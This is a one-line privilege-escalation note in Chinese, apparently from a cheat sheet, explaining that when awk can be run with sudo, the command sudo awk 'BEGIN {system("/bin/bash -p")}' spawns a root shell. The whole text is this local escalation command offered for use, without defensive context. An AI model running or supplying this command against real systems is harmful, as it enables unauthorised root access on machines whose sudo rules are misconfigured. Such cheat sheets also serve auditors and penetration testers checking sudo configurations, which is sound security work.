# awk

`awk` 若具有 `sudo` 权限,一句话提权root权限
```
sudo awk 'BEGIN {system("/bin/bash -p")}'
```